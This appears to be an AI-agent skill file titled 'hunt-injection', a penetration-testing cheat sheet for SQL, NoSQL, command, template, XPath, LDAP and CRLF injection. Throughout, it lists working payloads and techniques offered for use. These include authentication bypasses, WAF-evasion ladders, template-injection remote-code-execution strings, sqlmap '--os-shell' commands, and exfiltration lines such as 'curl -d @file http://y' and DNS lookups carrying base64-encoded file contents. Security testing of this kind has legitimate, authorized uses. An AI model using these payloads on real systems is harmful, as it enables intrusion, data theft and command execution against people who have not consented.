---
name: hunt-injection
description: >-
  Hunt for server-side input injection — SQLi, NoSQLi, Command Injection, SSTI, XPath,
  LDAP, CRLF. Built from personal notes for all seven types with DBMS-specific payloads,
  WAF bypass ladders, and tool commands (sqlmap/ghauri/nosqli/commix/tplmap). Use when any
  parameter reaches a database, shell, template engine, XML query, LDAP filter, or HTTP
  response headers.
mitre_attack: [T1190, T1059]
---

# Input Injection (from your notes + advanced)

> See also (project skills): `hunt-sqli` (modern SQLi from reports), `hunt-rce`, `hunt-api-misconfig` (prototype pollution JWT handling). This skill owns the full 7-type ladder; `hunt-sqli` owns the modern ORM/NoSQL-adjacent detail.

## SQLi (your notes)

**Methodology:** Discovery (every input incl. headers/cookies/JSON) → Confirm (TRUE/FALSE + math `2-1` + time) → Enumerate (DBMS fingerprint, version, dbs, tables, columns) → Exploit (best working technique) → Post-exploit (files, commands) — only if authorized.

**Type → when → core technique:**
- Union: output visible → `ORDER BY n` → `UNION SELECT NULL×n` → replace NULL with data
- Error: errors visible → `EXTRACTVALUE(1,CONCAT(0x5c,(SELECT database())))` / `CONVERT(int,@@version)` / `CAST(... AS int)`
- Boolean blind: page differs → `ASCII(SUBSTRING(...))=X` binary search
- Time blind: nothing visible → `IF(cond,SLEEP(3),0)` per DBMS
- OOB: fully blind → Burp Collaborator DNS/HTTP exfil (`LOAD_FILE('\\x.collab\a')`, `xp_dirtree`, `COPY TO PROGRAM nslookup`, `UTL_HTTP`)
- Stacked: MSSQL `;EXEC`, PG `;COPY` (results not returned — for RCE/delay)
- Second-order: stored payload triggers later
- Auth bypass: `' OR '1'='1'--`, `admin'--`, `LIMIT 1`, `ffifdyop` magic hash

**DBMS quick hits (your tables):**
- MySQL: `@@version`, `information_schema`, `GROUP_CONCAT`, `SLEEP`, `LOAD_FILE`/`INTO OUTFILE`, `secure_file_priv`, UDF → RCE
- MSSQL: `@@version`/`SYSTEM_USER`, `master..sysdatabases`, `WAITFOR DELAY`, enable `xp_cmdshell`, linked servers `OPENQUERY`
- PostgreSQL: `version()`, `pg_sleep`, `COPY ... TO PROGRAM` (superuser), `pg_read_file`
- Oracle: `v$version`, `dual`, `DBMS_PIPE.RECEIVE_MESSAGE`, `UTL_HTTP`, Java source → RCE
- SQLite: `sqlite_master`, heavy queries for delay (no SLEEP), `ATTACH DATABASE` trick

**WAF bypass groups (your master list):** no-space (`%09 %0A /**/ ()`) → no-comma (`LIMIT 1 OFFSET 0`, `SUBSTR(x FROM 1 FOR 1)`, JOIN in UNION) → no-equal (`LIKE/BETWEEN/IN/RLIKE`, `NOT < AND NOT >`) → keyword blacklist (case, `/*!50000SELECT*/`, split `SE%0ALECT`, `CONCAT`/`CHAR` rebuild) → encoding (single/double URL, Unicode, fullwidth) → sci-notation (`1.e1`) → boolean equivalents (`AND 1` / `AND TRUE`).

**Tools (your one-liners):**
```bash
sqlmap -u URL -p id --batch --random-agent --level=3 --risk=2 --tamper=space2comment,between
sqlmap -r req.txt --batch --os-shell            # from Burp
ghauri -u URL --batch --technique=BET --dbs      # faster on blind
```
Burp: Intruder + Grep-Match for SQL errors; Collaborator for OOB; Turbo Intruder for binary-search speed.

## NoSQLi (your notes)

- Signals: JSON bodies, Mongo backends, `find(req.body)` patterns, login/search/export.
- Auth bypass ladder: `{"username":{"$ne":null},"password":{"$ne":null}}`, `username[$ne]=1`, `$regex:.*`.
- Blind data extraction: `$regex` char-by-char (`^a`, `^ad`, `^adm...`).
- `$where` JS injection: `admin' || 1==1//` — danger = code exec.
- Time-based via `$where` (CVE-2023-28359 pattern).
- Type confusion: send object/array where string expected (`{"$regex":".*"}`).
- GraphQL→Mongo: inject operators into `filter` args.
- Aggregation `$lookup` abuse to read other collections.
- Error-based: `$where` throwing `new Error(JSON.stringify(this))` leaks whole doc.
- ORM level: Mongoose populate match injection (CVE-2024-53900 / CVE-2025-23061) → potential Node RCE.
- Tool: `nosqli scan -t URL [-d data | -r req.txt]`.
- Quick list: `{$ne:1} {$gt:""} {$regex:".*"} {$exists:true} '|| 1==1// [$ne]=1 ';sleep(5000);`

## Command Injection (your notes)

- **Where:** ping/diag/import/export features, URL fetchers, image/PDF processors, filename handling, `?ip= ?host= ?file=`, headers (UA/XFF/Referer), WebSocket messages, admin rule engines.
- **Detection flow:** time delay (`;sleep 5`, `|sleep 5`, `%0asleep 5`) → OOB callback (`;curl your.domain`, `$(nslookup x.y)`) → visible output (`;id`).
- **Chaining:** `; && || | %0a %0d%0a \`cmd\` $(cmd)`; Windows `& && ||`.
- **Quoted-context escape:** `';id #'` `";id #"` then command.
- **Filter bypasses:** no space → `${IFS}`, `{cat,/etc/passwd}`, `%09`; no slash → `${HOME:0:1}` or wildcards `/???/??t`; no special chars → newline `%0a`, backticks; no curl/wget → python/perl one-liners, `/dev/tcp`; no cat → head/tail/xxd/od/nl.
- **Exfil:** `curl -d @file http://y`, `nslookup $(cat f|base64).y`, time-based char extraction, redirect to web dir.
- Tools: commix, nuclei templates, Burp Collaborator (essential for blind).
- Polyglot from your notes: `1;sleep${IFS}9;#';sleep${IFS}9;#";sleep${IFS}9;#`

## SSTI (your notes)

- **Where:** email/invoice/PDF templates, preview features, CMS custom templates, profile greetings, report generators, webhooks.
- **Detect:** polyglot `${{<%[%'"}}%\` → arithmetic `{{7*7}} ${7*7} #{7*7} <%=7*7%>` → error fingerprint `(1/0).zxy.zxy` (ZeroDivisionError=Python, ArithmeticException=Java, etc.)
- **Identify:** Jinja2 `{{7*'7'}}` → 7777777 (vs Twig → 49); Django errors on math; FreeMarker `${7*7}` + legacy `#{7*7}`.
- **Key RCE payloads (your set):**
  - Jinja2: `{{cycler.__init__.__globals__.os.popen('id').read()}}`, `{{lipsum.__globals__["os"].popen('id').read()}}`
  - Twig: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`, `{{['id']|filter('system')}}`
  - FreeMarker: `${"freemarker.template.utility.Execute"?new()("id")}`
  - Thymeleaf: `${T(java.lang.Runtime).getRuntime().exec('calc')}`, URL-based `/(7*7)` Spring view manipulation
  - SpEL: `${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}`
  - Velocity / OGNL (with error/boolean/time variants) / Ruby ERB `<%= system("id") %>` / Pug/Nunjucks/Handlebars chains.
- **Blind:** time (`sleep 5` via globals), OOB DNS/HTTP callbacks, boolean via Content-Length.
- **Filter bypass:** `|attr()` when `.` blocked, `_` hex for `_`, tuple instead of `[]`, `%c%c|format()`, scientific `1.e1`, regex `\A\z` (Ruby), double rendering.
- Tools: `TInjA url -u ...`, `sstimap.py -u ... --crawl 5 --forms`, tplmap, Burp Collaborator.

## XPath (your notes)

- **Signals:** XML responses, SOAP, `text/xml` content type, XPathException errors, legacy panels.
- **Confirm XPath (not SQL):** `' or count(//*)>0 or '`.
- **Auth bypass:** `' or '1'='1`, `*)(&`, `'or position()=2 or'`, `admin' or '`.
- **Visible dump:** `')] | //user/password[('')=('`.
- **Blind:** `string-length()` → `substring()` char-by-char (binary search `> 'm'`); schema crawl: `count(/*[1]/*)` recurse, `name()` + `substring(name(),1,1)`.
- **XPath 2.0 (if available — escalate):** `doc('file:///etc/passwd')` file read, `doc(concat("http://attacker/",/user/name))` OOB exfil, error-based `if(cond) then error()`.
- **Null byte:** `' or 1]%00` truncates the rest of the query.

## LDAP (your notes)

- **Signals:** AD-backed login, employee portals, VPN/SSO, NTLM/Kerberos, errors: `Invalid DN`, `80090308`, filter error.
- **Filter shape:** `(&(uid=USER)(password=PASS))`.
- **Detection:** `*` `)(` `*)(` then boolean True/False payloads (`*)(objectClass=*))(&objectClass=void` vs `void)(objectClass=void))...`).
- **Bypass set (your list):** `user=*&pass=*` wildcard; `user=*)(|` OR logic; `admin)(!(&(|` always-true trick ((|) = False, !False = True); null byte `user=*))%00`; `admin)(&)`.
- **Blind extraction:** `(&(sn=admin)(password=MA*))` char-by-char.
- **Attribute discovery:** brute-force attributes (cn, sn, uid, mail, userPassword, memberOf, sAMAccountName...) with the discovery script pattern from your notes.
- Remediation for reports: escape `* ( ) | &`, parameterized queries, least privilege.

## CRLF (your notes)

- **Core:** `\r\n` = `%0D%0A` terminates headers. Reflected header values without sanitization → inject headers, or double CRLF → body injection (response splitting).
- **Test flow:** find reflection in headers (lang/redirect/page) → `%0d%0aInjected: yes` → double CRLF + HTML.
- **Escalations:** Set-Cookie (fixation/admin flag), `Location:` open redirect, XSS via body split + `X-XSS-Protection:0`, **cache poisoning**, CORS header injection, log forging, smuggling chain.
- **Bypass filters:** Unicode newlines `%E2%80%A8 %E2%80%A9 %C2%85`; Firefox trick `%E5%98%8A`→`%0A`, `%E5%98%8D`→`%0D`.
- Tools: CRLFsuite, crlfuzz, Crlfix.

## 🚀 Advanced (beyond your notes)

- **SQLi — heavy-query delays** to evade WAFs that block `SLEEP`: `BENCHMARK(10^7, MD5(1))` (MySQL), recursive CTEs in PG, cartesian joins — same oracle, no banned keyword.
- **SQLi — second-order via ORM**: payload stored through one endpoint (safe), executed when ORM composes it into another query — test multi-step flows, not single requests.
- **NoSQL — Mongo aggregation pipeline injection**: inject stages (`$match`, `$where`) into aggregation arrays; also test **$expr** contexts and Redis command injection over RESP via SSRF gopher payloads.
- **CMDi — argument injection (not just chaining)**: when input is a single argument, inject option-like values — git (`--upload-pack=/evil`), curl (`-o /path`, `--config`), tar (`--checkpoint-action=exec=cmd`), ssh (`-o ProxyCommand=cmd`). WorstFit fullwidth-quote bypass of `escapeshellarg` from your notes extends here.
- **SSTI — ESI injection**: apps behind Akamai/Varnish may process `<esi:include src="...">` in responses — combine with SSTI/XSS for edge-side code paths.
- **SSTI — XSLT injection**: if the app transforms XML via XSLT, `document()` + `xsl:include` give file read/OOB beyond XPath 1.0 — fingerprint by `system-property('xsl:version')`.
- **LDAP — DN injection** (beyond filter injection): user input inside a Distinguished Name (`cn=USER,ou=users`) → inject `,` / null byte to escape the container and bind as another entry.
- **CRLF → practical chains:** CRLF to set `Location` on a 3xx cached by CDN = stored open redirect for all users; CRLF inside logs → forged auth entries for log-based access control.
- **Cross-type oracle stacking**: a single parameter may accept multiple injection classes — run the discovery ladder for SQL → NoSQL → template → command → XPath in sequence before concluding "safe".

## Validation checklist
- [ ] SQLi: real data extracted (version/table) or OOB hit — not just an error
- [ ] CMDi: OOB callback received or unique-marker execution
- [ ] Blind/time: ≥3 consistent deltas to rule out network noise
- [ ] SSTI: engine confirmed + RCE/sensitive read (not just `{{7*7}}`)
- [ ] XPath/LDAP: full bypass cycle completed (login or field extraction)
- [ ] Second-order: both storage point and trigger point documented